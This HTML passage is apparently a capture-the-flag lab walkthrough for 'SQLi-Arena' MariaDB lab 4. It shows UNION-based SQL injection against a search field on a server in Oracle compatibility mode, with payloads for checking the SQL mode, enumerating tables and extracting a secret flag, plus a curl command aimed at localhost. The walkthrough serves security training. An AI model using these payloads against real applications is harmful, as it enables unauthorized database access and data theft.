<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>SQL<br>
        <span class="prompt">SQL: </span>SET SQL_MODE='ORACLE';<br>
        <span class="prompt">SQL: </span>SELECT id, name, value FROM oracle_data WHERE name LIKE '%SQL%'<br><br>
        <span class="prompt">Output:</span><br>
        1 | SQL_MODE | ORACLE<br>
        2 | PLSQL_COMPAT | ENABLED
    </div>
</div>

<h4>Step 2: Confirm Injection and Oracle Mode</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error + SQL Mode Check</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MariaDB Error:</strong> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%'' at line 1<br><br>
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT 1, @@sql_mode, NULL -- -<br>
        <span class="prompt">Output: </span>PIPES_AS_CONCAT,ANSI_QUOTES,IGNORE_SPACE,<strong>ORACLE</strong>,NO_KEY_OPTIONS,NO_TABLE_OPTIONS,NO_FIELD_OPTIONS,NO_AUTO_CREATE_USER,SIMULTANEOUS_ASSIGNMENT<br>
        <span class="prompt">// Confirmed: Oracle compatibility mode is active</span>
    </div>
</div>

<h4>Step 3: Test || Concatenation Operator</h4>
<p>
    In Oracle mode, <code>||</code> is string concatenation (not logical OR as in standard MySQL).
    This changes how payloads work and opens Oracle-style injection techniques.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Test Concatenation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT 1, 'ORACLE' || '_MODE', NULL -- -<br><br>
        <span class="prompt">Output:</span><br>
        1 | <strong>ORACLE_MODE</strong><br>
        <span class="prompt">// Confirmed: || concatenates strings, not logical OR</span>
    </div>
</div>

<h4>Step 4: Enumerate Tables</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Table Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT 1, table_name, NULL FROM information_schema.tables WHERE table_schema=database() -- -<br><br>
        <span class="prompt">Output:</span><br>
        1 | oracle_secrets<br>
        1 | oracle_data
    </div>
</div>

<h4>Step 5: Extract Flag Using || Concatenation</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Extract with Oracle-Style Concat</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>XYZNOTEXIST' UNION SELECT id, 'SECRET=' || secret_value, NULL FROM oracle_secrets -- -<br><br>
        <span class="prompt">Output:</span><br>
        1 | <strong>SECRET=FLAG{ma_0r4cl3_m0d3_plsql}</strong>
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the secret value and paste it into the verification form:
    <code>FLAG{ma_0r4cl3_m0d3_plsql}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mariadb/lab4" \<br> --data-urlencode "name=XYZNOTEXIST' UNION SELECT id, 'SECRET=' || secret_value, NULL FROM oracle_secrets -- -"<br><br>
        <span class="prompt">Result: </span>1 | <strong>SECRET=FLAG{ma_0r4cl3_m0d3_plsql}</strong>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MariaDB's Oracle compatibility mode (<code>SET SQL_MODE='ORACLE'</code>)
    changes fundamental SQL behavior. The <code>||</code> operator switches from logical OR to
    string concatenation, empty strings become NULL, and Oracle-specific functions like
    <code>DECODE()</code> change their semantics. When testing a MariaDB target, always check
    <code>@@sql_mode</code>: Oracle mode changes what payloads will work and opens up
    Oracle-style injection techniques on a MySQL-compatible engine. The <code>||</code> concatenation
    is particularly useful for combining extracted data with labels in a single field.
</div>
